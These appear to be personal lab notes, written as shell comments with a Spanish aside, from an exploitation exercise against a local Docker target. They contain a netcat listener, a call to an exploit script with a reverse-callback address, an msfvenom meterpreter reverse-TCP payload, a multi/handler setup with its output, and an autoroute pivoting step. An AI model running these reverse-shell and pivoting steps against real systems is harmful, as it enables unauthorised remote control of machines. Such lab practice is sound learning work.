# $ nc -l -p 8081
# $ bash 50446.sh http://localhost:8080 172.17.0.1 8081 &
 
# $ msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o payload.bin
# OJO: meterpreter_ es stageless, mientras que meterpreter/ no --> https://buffered.io/posts/staged-vs-stageless-handlers/

# $ msfconsole
# > use /multi/handler
# msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp # https://www.infosecmatter.com/why-is-your-meterpreter-session-dying-try-these-fixes/
# msf6 exploit(multi/handler) > options
#
# Module options (exploit/multi/handler):
#
#    Name  Current Setting  Required  Description
#    ----  ---------------  --------  -----------
#
#
# Payload options (linux/x64/meterpreter_reverse_tcp):
#
#    Name   Current Setting  Required  Description
#    ----   ---------------  --------  -----------
#    LHOST  172.17.0.1       yes       The listen address (an interface may be specified)
#    LPORT  4444             yes       The listen port
#
#
# Exploit target:
#
#    Id  Name
#    --  ----
#    0   Wildcard Target


# > use post/multi/manage/autoroute